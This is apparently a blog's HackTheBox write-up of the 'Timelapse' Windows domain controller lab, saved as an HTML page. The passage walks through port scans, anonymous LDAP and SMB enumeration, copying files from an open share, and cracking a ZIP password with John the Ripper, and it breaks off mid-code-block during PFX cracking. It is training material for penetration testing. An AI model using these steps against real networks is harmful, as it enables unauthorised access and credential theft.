@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Timelapse - HackTheBox Writeup (10.10.11.152)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Timelapse - HackTheBox Writeup (10.10.11.152)">
+  
+    <meta name="description" content="Easy-difficulty Windows machine with a focus on Active Directory LDAP and SMB enumeration. Privilege escalation by recovering service account credentials in PowerShell history logs, then dumping LAPS passwords from the service account.">
+    <meta property="og:description" content="Easy-difficulty Windows machine with a focus on Active Directory LDAP and SMB enumeration. Privilege escalation by recovering service account credentials in PowerShell history logs, then dumping LAPS passwords from the service account.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">Timelapse - HackTheBox Writeup (10.10.11.152)</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jul 17, 2022</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
+            <a href="tag/Active_Directory">Active Directory</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
+            <a href="tag/SMB">SMB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/LAPS">LAPS</a>
+          </span>
+        
+      </div>
+      <div>
+        Easy-difficulty Windows machine with a focus on Active Directory LDAP and SMB enumeration. Privilege escalation by recovering service account credentials in PowerShell history logs, then dumping LAPS passwords from the service account.
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/91bb41dce4ab452daa98651440a32e97" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/ac9afb2efbd64a9080c9c2ba991a2ca8" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/ac9afb2efbd64a9080c9c2ba991a2ca8"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Preface</span></span></h2><div id="https://www.notion.so/35ff5652f7ef496ab950b90488904466" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I have been a bit tardy with HackTheBox lately, so I thought I will give this “easy” machine a go.</span></span></p></div><div id="https://www.notion.so/4be8057e373043f0983cb0fe90d1e359" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As it turns out, while the concept of the attack was quite simple and consisted of nothing new, the enumeration wasn’t as easy as I thought it would be and really made me realise I need to up my enumeration game. It’s so very easy to miss simple things like checking for SMB shares accessible with null authentication, or even just checking for open UDP ports.</span></span></p></div><h2 id="https://www.notion.so/a3d8904e12404c32a2ac5b85e5f83107" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/a3d8904e12404c32a2ac5b85e5f83107"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Reconnaissance</span></span></h2><div id="https://www.notion.so/48f2631f15db4923b3e89c240c1c2d9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As always, before we start, let’s add the target IP and hostname to our </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hosts</code></span><span class="SemanticString"> file:</span></span></p></div><div id="https://www.notion.so/19a3574152634eb992a7b6c9ce5fc907" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nano /etc/hosts</code></span></span></p></div><pre id="https://www.notion.so/667bb942918f49099675618149d44fce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.10.11.152    timelapse.htb</span></span></span></code></pre><div id="https://www.notion.so/b5182ea09a244bde8dcc49fdf6dd8af3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We perform a simple port scan to see what services are running on the target.</span></span></p></div><div id="https://www.notion.so/901509b1cb554d35894b1bb110557207" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- timelapse.htb -Pn | tee ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/c1582e85098948aba669ff4e48379dbc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Nmap scan report for timelapse.htb (10.10.11.152)
+Host is up (0.032s latency).
+Not shown: 65519 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49696/tcp open  unknown
+57139/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 105.12 seconds</span></span></span></code></pre><div id="https://www.notion.so/663b326cb1ce4ee3938cee9539bb0b35" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We see that the target has quite a lot of services running on it. Ignoring the high port numbers (&gt;40000), let’s get more information about them by performing a script scan (-sC) with version detection enabled (-sV):</span></span></p></div><div id="https://www.notion.so/e8716cddbfae449fac4d5f25e472ce8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,5986,9389 timelapse.htb -Pn | tee targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/3472b93cf5944a2a937f6b5736ba6c5b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Nmap scan report for timelapse.htb (10.10.11.152)
+Host is up (0.029s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-10 19:30:33Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: 2022-07-10T19:31:54+00:00; +7h59m58s from scanner time.
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-07-10T19:31:15
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.62 seconds</span></span></span></code></pre><div id="https://www.notion.so/9ee5eff864b24ac0864bd4b689436abe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The target is running DNS, Kerberos, Windows RPC, NetBIOS, LDAP, SMB, and a plethora of other Active Directory related services, which makes me think our target is a domain controller. Curiously, WinRM is also exposed on port 5986, so that could be an entry point for us. SMB message signing is also enabled and required, which means there won’t be any opportunity for SMB relay attacks if we were to discover additional hosts on the network.</span></span></p></div><h2 id="https://www.notion.so/8857df48cf0949c2abc480dcfb10b171" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/8857df48cf0949c2abc480dcfb10b171"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><div id="https://www.notion.so/6f07d4378b68447bb33dcc362ebf56c8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LDAP Enumeration</strong></span></span></p></div><div id="https://www.notion.so/d22db58b9f6f499a917b964a667bc3df" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We begin our enumeration by performing a few LDAP search queries. To start off, we query the LDAP server for naming contexts to see if anonymous authentication is allowed:</span></span></p></div><div id="https://www.notion.so/0b3eeff4713b419d91217a3eb03b483c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">$ ldapsearch -x -h timelapse.htb -s base namingcontexts</strong></code></span></span></p></div><pre id="https://www.notion.so/72c2a42c52cf46e18c06e7eee309ab07" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># extended LDIF</span>
+<span class="token comment">#</span>
+<span class="token comment"># LDAPv3</span>
+<span class="token comment"># base &lt;> (default) with scope baseObject</span>
+<span class="token comment"># filter: (objectclass=*)</span>
+<span class="token comment"># requesting: namingcontexts </span>
+<span class="token comment">#</span>
+
+<span class="token comment">#</span>
+dn<span class="token punctuation">:</span>
+namingcontexts<span class="token punctuation">:</span> DC<span class="token operator">=</span>timelapse<span class="token punctuation">,</span>DC<span class="token operator">=</span>htb
+namingcontexts<span class="token punctuation">:</span> CN<span class="token operator">=</span>Configuration<span class="token punctuation">,</span>DC<span class="token operator">=</span>timelapse<span class="token punctuation">,</span>DC<span class="token operator">=</span>htb
+namingcontexts<span class="token punctuation">:</span> CN<span class="token operator">=</span>Schema<span class="token punctuation">,</span>CN<span class="token operator">=</span>Configuration<span class="token punctuation">,</span>DC<span class="token operator">=</span>timelapse<span class="token punctuation">,</span>DC<span class="token operator">=</span>htb
+namingcontexts<span class="token punctuation">:</span> DC<span class="token operator">=</span>DomainDnsZones<span class="token punctuation">,</span>DC<span class="token operator">=</span>timelapse<span class="token punctuation">,</span>DC<span class="token operator">=</span>htb
+namingcontexts<span class="token punctuation">:</span> DC<span class="token operator">=</span>ForestDnsZones<span class="token punctuation">,</span>DC<span class="token operator">=</span>timelapse<span class="token punctuation">,</span>DC<span class="token operator">=</span>htb
+
+<span class="token comment"># search result</span>
+search<span class="token punctuation">:</span> <span class="token number">2</span>
+result<span class="token punctuation">:</span> <span class="token number">0</span> Success
+
+<span class="token comment"># numResponses: 2</span>
+<span class="token comment"># numEntries: 1</span></span></span></span></code></pre><div id="https://www.notion.so/fbbda04c4b654679b925c3e71f44da32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Querying for scope subtree instead of baseObject:</span></span></p></div><div id="https://www.notion.so/ce82681eb0124be5924ddd5b7220d1cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ldapsearch -x -h timelapse.htb -s sub -b &quot;DC=timelapse,DC=htb&quot;</code></span></span></p></div><pre id="https://www.notion.so/3c36a5205c7b4f3ea079be0c4bd7c507" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># extended LDIF</span>
+<span class="token comment">#</span>
+<span class="token comment"># LDAPv3</span>
+<span class="token comment"># base &lt;DC=timelapse,DC=htb> with scope subtree</span>
+<span class="token comment"># filter: (objectclass=*)</span>
+<span class="token comment"># requesting: ALL</span>
+<span class="token comment">#</span>
+
+<span class="token comment"># search result</span>
+search<span class="token punctuation">:</span> <span class="token number">2</span>
+result<span class="token punctuation">:</span> <span class="token number">1</span> Operations error
+text<span class="token punctuation">:</span> 000004DC<span class="token punctuation">:</span> LdapErr<span class="token punctuation">:</span> DSID<span class="token operator">-</span>0C090A5C<span class="token punctuation">,</span> comment<span class="token punctuation">:</span> In order to perform this opera
+ tion a successful bind must be completed on the connection<span class="token punctuation">.</span><span class="token punctuation">,</span> data <span class="token number">0</span><span class="token punctuation">,</span> v4563
+
+<span class="token comment"># numResponses: 1</span></span></span></span></code></pre><div id="https://www.notion.so/a0645a7220844354acf0cfe57b4536ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The LDAP server is returning an error and telling us that a successful bind is necessary. It seems that we will need some credentials before we can get any useful information out of LDAP, so let’s move on.</span></span></p></div><div id="https://www.notion.so/75594697e22041e99dcbca7c0767d574" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Scanning for UDP ports</strong></span></span></p></div><div id="https://www.notion.so/d4cb51e37ec34969a7b9467c7630e3a7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After trying to enumerate for information RPC and setting up a zone transfer with DNS, I couldn’t find anything useful and ran into a wall. On recommendation of a friend, I decided to also scan for UDP ports. Scanning all of the ports will take a long time as UDP is a connectionless protocol, so I’ve opted to scan only the common ports:</span></span></p></div><div id="https://www.notion.so/3701b3c236d3472190d42235152b4053" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap -sU timelapse.htb | tee ports-udp.nmap</code></span></span></p></div><pre id="https://www.notion.so/354863efafce4f938f311f698a8e653a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Nmap scan report for timelapse.htb (10.10.11.152)
+Host is up (0.030s latency).
+Not shown: 997 open|filtered udp ports (no-response)
+PORT    STATE SERVICE
+53/udp  open  domain
+123/udp open  ntp
+389/udp open  ldap
+
+Nmap done: 1 IP address (1 host up) scanned in 17.14 seconds</span></span></span></code></pre><div id="https://www.notion.so/c2202f67ab824287804d90f4ec6099a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We see that the Network Time Protocol (NTP) is running on the machine, though this isn’t unexpected as our target is a domain controller.</span></span></p></div><div id="https://www.notion.so/3adf39ed32ac453c8bd74b0c2afbe384" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap -sC -sV -sU -p 53,123,389 timelapse.htb | tee targeted-udp.nmap</code></span></span></p></div><pre id="https://www.notion.so/ad673ec2e1504b5ba70672c6afecfd3e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Nmap scan report for timelapse.htb (10.10.11.152)
+Host is up (0.030s latency).
+
+PORT    STATE SERVICE VERSION
+53/udp  open  domain  (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   NBTStat: 
+|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+123/udp open  ntp     NTP v3
+| ntp-info: 
+|_  
+389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-UDP:V=7.92%I=7%D=7/10%Time=62CACB27%P=x86_64-pc-linux-gnu%r(NBTS
+SF:tat,32,&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAA
+SF:AAAAAAA\0\0!\0\x01&quot;);
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 8h00m07s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.62 seconds</span></span></span></code></pre><div id="https://www.notion.so/c9cfda2cc3534ef68c4a5ffe6a37d689" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At first, I thought we would have to somehow attack NTP as hinted by the machine name “Timelapse”, however, I wasn’t able to find anything useful other than DDoS amplification attacks and moved on.</span></span></p></div><div id="https://www.notion.so/71c69a45a3e84cc08cb58dd0b3d195f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SMB Enumeration</strong></span></span></p></div><div id="https://www.notion.so/83255e932e3b46bbb36ebf22b7fa77af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at SMB now, let’s use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">smbclient</code></span><span class="SemanticString"> to enumerate any open shares with null authentication:</span></span></p></div><div id="https://www.notion.so/c43aedb5e8e84b67b245579e4ee4a311" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ smbclient -L timelapse.htb -N</code></span></span></p></div><pre id="https://www.notion.so/2856fd6eb1b945f59808dd06feceed02" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+Shares          Disk      
+SYSVOL          Disk      Logon server share
+
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to timelapse.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</span></span></span></code></pre><div id="https://www.notion.so/81e53c1c3dcb4b14a506cc8fd93dea6a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like we received some error with SMB1, but this shouldn’t be cause for alarm. From the share enumeration, we see there is a “Shares” disk that we can read without authentication. Let’s explore further:</span></span></p></div><div id="https://www.notion.so/d5e822dad9204b79881abb5226073d94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ smbclient //timelapse.htb/Shares -N</code></span></span></p></div><div id="https://www.notion.so/7fc3573d4d1a4c3d8b195d8b9768e010" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&gt; dir</code></span></span></p></div><pre id="https://www.notion.so/6363464fe16942e9b58964eeac90f35c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>smb: \&gt; dir
+  .                                   D        0  Tue Oct 26 02:09:15 2021
+  ..                                  D        0  Tue Oct 26 02:09:15 2021
+  Dev                                 D        0  Tue Oct 26 06:10:06 2021
+  HelpDesk                            D        0  Tue Oct 26 02:18:42 2021
+
+6367231 blocks of size 4096. 2423634 blocks available</span></span></span></code></pre><div id="https://www.notion.so/745449c99dce45718a536438dfab3d97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There are some development-related files here, let’s mount into the share and copy the files so we can analyse them locally:</span></span></p></div><div id="https://www.notion.so/bc533df7158e4ddd903e24c1e673b7b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ mkdir smb &amp;&amp; sudo mount -t cifs //timelapse.htb/Shares ./smb</code></span></span></p></div><div id="https://www.notion.so/3c62519a17514803a6f929e3c92fe486" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cp -r ./smb/* .</code></span></span></p></div><div id="https://www.notion.so/641ad13a9cb243898286d6d6d6ec334a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo umount ./smb</code></span></span></p></div><div id="https://www.notion.so/85495ee97c124e9fb3ee1411a4728f8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We find a password-protected ZIP file in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/Dev</code></span><span class="SemanticString"> folder, we can extract the password hash and try to crack it:</span></span></p></div><div id="https://www.notion.so/4058866e6b324361948c5fdecb067e41" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ zip2john ./Dev/winrm_backup.zip &gt; winrm_backup_zip.hash</code></span></span></p></div><div id="https://www.notion.so/b18af3d678de45de9ca78fb7f3972d3f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the hash extracted, we see that it’s a PKZIP hash format. We will start cracking it with John the Ripper using the infamous </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rockyou.txt</code></span><span class="SemanticString"> dictionary:</span></span></p></div><div id="https://www.notion.so/e327222a069149ed9c6016ba59a5c735" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ john ./winrm_backup_zip.hash --wordlist=~/Desktop/rockyou.txt</code></span></span></p></div><pre id="https://www.notion.so/f544cb68c2eb42f59a8f93187022949f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2022-07-10 23:35) 2.702g/s 9387Kp/s 9387Kc/s 9387KC/s surkerior..superkebab
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/60709d44488e4279bcef8f812809bc9d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Within less than a second, we cracked the password: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">supremelegacy</code></span></span></p></div><div id="https://www.notion.so/41dc6ddc8af74e93b6edb37f7ea2bdce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Extracting the ZIP, we have a new </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.pfx</code></span><span class="SemanticString"> certificate, presumably used for connecting to the machine via WinRM. However, we can’t simply use the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.pfx</code></span><span class="SemanticString"> file to connect, we must extract the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.crt</code></span><span class="SemanticString"> certificate and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.key</code></span><span class="SemanticString"> private key from it first, and doing so requires the “import key”, which is used to protect the keypair when the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.pfx</code></span><span class="SemanticString"> file was created.</span></span></p></div><div id="https://www.notion.so/55d3d4e91d2048619441b7f49021107a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We will once again extract the hash and crack it with John the Ripper:</span></span></p></div><div id="https://www.notion.so/cbc77f1e03a94f219e7b5b70fde2816f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ pfx2john ./Dev/legacyy_dev_auth.pfx &gt; dev_auth_pfx.hash</code></span></span></p></div><div id="https://www.notion.so/cd7d1fbd23bb44b7ba1398b974281877" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ john dev_auth_pfx.hash --wordlist=~/Desktop/rockyou.txt</code></span></span></p></div><pre id="https://www.notion.so/22b1c2c58eae4f918c80eeb49b15af0d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span 